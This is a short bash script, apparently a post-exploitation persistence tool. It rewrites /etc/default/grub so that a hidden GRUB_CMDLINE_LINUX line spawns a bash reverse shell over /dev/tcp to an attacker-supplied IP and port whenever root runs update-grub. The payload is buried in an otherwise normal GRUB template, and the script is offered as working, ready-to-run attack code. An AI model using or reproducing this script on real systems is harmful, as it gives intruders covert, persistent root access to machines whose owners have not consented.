#!/bin/bash

##################################################################################################
# update-grub_hook.sh                                                                            #
# Gain persistence through update-grub                                                           #
# Every time user tries sudo update-grub command we gain root access if we set a listener first  #
# by 0bfxgh0st*                                                                                  #
##################################################################################################

function _grub_template_pt1_(){
cat << 'EOF'
# If you change this file, run 'update-grub' afterwards to update
# /boot/grub/grub.cfg.
# For full documentation of the options in this file, see:
#   info -f grub -n 'Simple configuration'

GRUB_DEFAULT=0
GRUB_TIMEOUT=5
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="quiet"
EOF
}

function _payload_(){
printf "%s\n\n" "GRUB_CMDLINE_LINUX=\`bash -c \"bash -i >& /dev/tcp/$1/$2 0>&1 &\" 2>/dev/null\`"
}

function _grub_template_pt2_(){
cat << "EOF"
# Uncomment to enable BadRAM filtering, modify to suit your needs
# This works with Linux (no patch required) and with any kernel that obtains
# the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)
#GRUB_BADRAM="0x01234567,0xfefefefe,0x89abcdef,0xefefefef"

# Uncomment to disable graphical terminal (grub-pc only)
#GRUB_TERMINAL=console

# The resolution used on graphical terminal
# note that you can use only modes which your graphic card supports via VBE
# you can see them in real GRUB with the command `vbeinfo'
#GRUB_GFXMODE=640x480

# Uncomment if you don't want GRUB to pass "root=UUID=xxx" parameter to Linux
#GRUB_DISABLE_LINUX_UUID=true

# Uncomment to disable generation of recovery mode menu entries
#GRUB_DISABLE_RECOVERY="true"

# Uncomment to get a beep at grub start
#GRUB_INIT_TUNE="480 440 1"
EOF
}

if [[ $(id -u) != 0 ]]
then
	printf "%s\n" "Run as root"
	exit
fi

if [[ -z "$1" ]] || [[ -z "$2" ]]
then
	printf "%s\n" "usage sudo bash update-grub_hook.sh <ip> <port>"
else

	grubdir="/etc/default/grub"

	_grub_template_pt1_ > $grubdir
	_payload_ "$1" "$2" >> $grubdir
	_grub_template_pt2_ >> $grubdir
	printf "[\e[32m+\e[0m] update-grub hooked\n"
	printf "[\e[32m+\e[0m] Persistence through update-grub success\n"
fi

